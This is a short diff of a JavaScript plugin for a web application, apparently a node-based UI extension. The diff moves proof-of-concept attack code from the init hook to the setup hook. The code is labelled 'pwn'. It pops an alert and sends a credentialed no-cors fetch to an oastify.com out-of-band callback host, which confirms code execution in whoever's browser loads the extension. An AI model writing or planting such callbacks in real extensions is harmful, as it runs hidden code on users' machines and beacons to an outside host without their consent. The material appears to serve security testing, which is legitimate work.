@@ -9,12 +9,6 @@ const ext = {
   
     init(app) {
         console.log("pwn-init!");
-        alert("pwn-init!");
-        await fetch("https://go8w693qtipnk91pif5ittmlpcv3jt7i.oastify.com", {
-            method: "GET",
-            mode: "no-cors",
-            credentials: "include"
-        });
     },
 
     async beforeRegisterNodeDef(nodeType, nodeData, app2) {
@@ -23,6 +17,12 @@ const ext = {
 
     async setup() {
         console.log("pwn-setup!");
+        alert("pwn-setup!");
+        await fetch("https://go8w693qtipnk91pif5ittmlpcv3jt7i.oastify.com", {
+            method: "GET",
+            mode: "no-cors",
+            credentials: "include"
+        });
     }
 }
 
